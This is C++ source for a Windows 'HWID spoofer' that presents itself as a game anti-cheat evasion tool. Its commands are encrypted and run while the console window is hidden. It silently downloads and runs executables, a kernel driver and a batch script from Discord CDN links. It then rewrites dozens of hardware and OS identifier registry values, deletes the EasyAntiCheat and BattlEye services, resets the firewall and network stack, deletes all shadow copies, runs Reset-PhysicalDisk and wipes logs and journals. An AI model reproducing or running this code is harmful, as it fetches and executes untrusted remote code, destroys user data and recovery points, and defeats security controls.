#include <windows.h>
#include <iostream>
#include <random>
#include <thread>
#include "Encrypt.hpp"

std::string Random(std::string::size_type length)
{
	static auto& chrs = "0123456789ABCDEF";
	thread_local static std::mt19937 rg{ std::random_device{}() };
	thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);
	std::string s;
	s.reserve(length);
	while (length--)
	s += chrs[pick(rg)];
	return s;
}

void Console()
{
	HWND console = GetConsoleWindow();
	if (console != NULL)
	{
		DWORD style = GetWindowLong(console, GWL_STYLE);
		style = style & ~(WS_VSCROLL | WS_HSCROLL);
		SetWindowLong(console, GWL_STYLE, style);
		SetWindowPos(console, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_FRAMECHANGED);
	}
}

void Cursor(bool showFlag)
{
	HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_CURSOR_INFO cursorInfo;
	GetConsoleCursorInfo(out, &cursorInfo);
	cursorInfo.bVisible = showFlag;
	SetConsoleCursorInfo(out, &cursorInfo);
}

int main()
{
	HWND console = GetConsoleWindow();
	Console();
	Cursor(false);
	SetConsoleTitleA(Encrypt("Solution").decrypt());
	system(Encrypt("color f").decrypt());
	printf(Encrypt("Press Any Key To Spoof The Device..").decrypt());
	system(Encrypt("pause >nul").decrypt());
	ShowWindow(console, SW_HIDE);
	system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1185313074098471014/Solution.exe --output C:\\Windows\\GameBarPresenceWriter\\Solution.exe >nul").decrypt());
	system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1185313079655923892/Solution64.sys --output C:\\Windows\\GameBarPresenceWriter\\Solution64.sys >nul").decrypt());
	system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1185313094755426345/Disk1.exe --output C:\\Windows\\GameBarPresenceWriter\\Disk1.exe >nul").decrypt());
	system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1185313100396777592/Disk2.exe --output C:\\Windows\\GameBarPresenceWriter\\Disk2.exe >nul").decrypt());
	system(Encrypt("curl --silent https://cdn.discordapp.com/attachments/1176556739953447003/1185313104968560762/Mac.bat --output C:\\Windows\\GameBarPresenceWriter\\Mac.bat >nul").decrypt());
	Sleep(2000);
	system(Encrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName /v ComputerName /t REG_SZ /d %random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName /v ComputerName /t REG_SZ /d %random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareId /t REG_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareIds /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\" \"Profiles\\0001 /v HwProfileGuid /t REG_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\SQMClient /v MachineId /t REG_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\SQMClient /v WinSqmFirstSessionStartTime /t REG_QWORD /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Cryptography /v GUID /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\HardwareConfig /v LastConfig /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v ClientUUID /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v PersistenceIdentifier /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global\\CoProcManager /v ChipsetMatchID /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"0\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"1\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0 /v Identifier /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1 /v Identifier /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\BasicDisplay\\Video /v VideoID /t REG_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Hostname /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul >nul").decrypt());
	system(Encrypt("reg add HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Domain /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul >nul").decrypt());
	system(Encrypt("reg add HKLM\\System\\CurrentControlSet\\Control\\DevQuery\\6 /v UUID /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v NV\" \"Hostname /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallTime /t REG_QWORD /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallDate /t REG_QWORD /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v ProductId /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildGUID /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\Software\\Microsoft /v BuildLab /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\Software\\Microsoft /v BuildLabEx /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v AccountDomainSid /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v PingID /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v SusClientId /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\Tracing\\Microsoft\\Profile\\Profile /v Guid /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v RegisteredOwner /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v RegisteredOrganization /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildBranch /t REG_SZ /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId /t REG_BINARY /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId4 /t REG_BINARY /d %random%%random%-%random%%random%-%random%%random% /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\mouhid\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\kbdhid\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\USBHUB3\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
	system(Encrypt("reg add HKLM\\SYSTEM\\ControlSet001\\Services\\USBXHCI\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%%random%-%random%%random%-%random%%random%} /f >nul").decrypt());
	system(Encrypt("reg delete HKLM\\SYSTEM\\MountedDevices /f >nul").decrypt());
	system(Encrypt("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f >nul").decrypt());
	system(Encrypt("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume /f >nul").decrypt());
	system(Encrypt("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2 /f >nul").decrypt());
	system(Encrypt("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v LastEnum /f >nul").decrypt());
	system(Encrypt("reg delete HKLM\\SOFTWARE\\Microsoft\\Dfrg\\Statistics /f >nul").decrypt());
	system(Encrypt("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v AcpiData /f >nul").decrypt());
	system(Encrypt("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v BiosData /f >nul").decrypt());
	system(Encrypt("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v RegistersData /f >nul").decrypt());
	system(Encrypt("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v SMBiosData /f >nul").decrypt());
	system(Encrypt("reg delete HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /f >nul").decrypt());
	system(Encrypt("reg delete HKLM\\SYSTEM\\ControlSet001\\Services\\EasyAntiCheat /f >nul").decrypt());
	system(Encrypt("reg delete HKLM\\SYSTEM\\ControlSet001\\Services\\BEService /f >nul").decrypt());
	system(Encrypt("C:\\Windows\\GameBarPresenceWriter\\Mac.bat >nul").decrypt());
	system((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe C: ").decrypt() + Random(4) + "-" + Random(4)).c_str());
	system((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe D: ").decrypt() + Random(4) + "-" + Random(4)).c_str());
	system((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe E: ").decrypt() + Random(4) + "-" + Random(4)).c_str());
	system((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe F: ").decrypt() + Random(4) + "-" + Random(4)).c_str());
	system(Encrypt("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /SU AUTO >nul").decrypt());
	system(Encrypt("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /SS %random%%random%-%random%%random%-%random%%random% >nul").decrypt());
	system(Encrypt("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /BS %random%%random%-%random%%random%-%random%%random% >nul").decrypt());
	system(Encrypt("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /CS %random%%random%-%random%%random%-%random%%random% >nul").decrypt());
	system(Encrypt("C:\\Windows\\GameBarPresenceWriter\\Solution.exe /PSN %random%%random%-%random%%random%-%random%%random% >nul").decrypt());
	system(Encrypt("sc stop winmgmt >nul").decrypt());
	system(Encrypt("sc start winmgmt >nul").decrypt());
	system(Encrypt("net stop winmgmt /y >nul").decrypt());
	system(Encrypt("net start winmgmt /y >nul").decrypt());
	system(Encrypt("ipconfig /flushdns >nul").decrypt());
	system(Encrypt("netsh int ip reset >nul").decrypt());
	system(Encrypt("netsh int reset all >nul").decrypt());
	system(Encrypt("netsh int ipv4 reset >nul").decrypt());
	system(Encrypt("netsh int ipv6 reset >nul").decrypt());
	system(Encrypt("netsh winsock reset >nul").decrypt());
	system(Encrypt("netsh advfirewall reset >nul").decrypt());
	system(Encrypt("netsh winsock reset catalog >nul").decrypt());
	system(Encrypt("powershell vssadmin delete shadows /all >nul").decrypt());
	system(Encrypt("powershell Reset-PhysicalDisk * >nul").decrypt());
	system(Encrypt("fsutil usn deletejournal /n C: >nul").decrypt());
	system(Encrypt("fsutil usn deletejournal /n D: >nul").decrypt());
	system(Encrypt("fsutil usn deletejournal /n E: >nul").decrypt());
	system(Encrypt("fsutil usn deletejournal /n F: >nul").decrypt());
	system(Encrypt("del /s /f /q C:\\Windows\\System32\\restore\\MachineGuid.txt >nul").decrypt());
	system(Encrypt("del /s /f /q C:\\System Volume Information\\IndexerVolumeGuid >nul").decrypt());
	system(Encrypt("del /s /f /q C:\\System Volume Information\\tracking.log >nul").decrypt());
	system(Encrypt("del /s /f /q C:\\Windows\\INF\\setupapi.dev.log >nul").decrypt());
	system(Encrypt("del /s /f /q C:\\Windows\\INF\\setupapi.setup.log >nul").decrypt());
	system(Encrypt("rmdir /s /q C:\\Windows\\temp >nul").decrypt());
	system(Encrypt("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Temp >nul").decrypt());
	system(Encrypt("rmdir /s /q C:\\Windows\\Prefetch >nul").decrypt());
	system(Encrypt("del C:\\Windows\\GameBarPresenceWriter\\Solution.exe >nul").decrypt());
	system(Encrypt("del C:\\Windows\\GameBarPresenceWriter\\Solution64.sys >nul").decrypt());
	system(Encrypt("del C:\\Windows\\GameBarPresenceWriter\\Disk1.exe >nul").decrypt());
	system(Encrypt("del C:\\Windows\\GameBarPresenceWriter\\Disk2.exe >nul").decrypt());
	system(Encrypt("del C:\\Windows\\GameBarPresenceWriter\\Mac.bat >nul").decrypt());
	system(Encrypt("cls").decrypt());
	ShowWindow(console, SW_SHOW);
	Cursor(false);
	Console();
	SetConsoleTitleA(Encrypt("Solution").decrypt());
	system(Encrypt("color f").decrypt());
	printf(Encrypt("The Device Is Now Spoofed..").decrypt());
	system(Encrypt("pause >nul").decrypt());
	exit(0);
}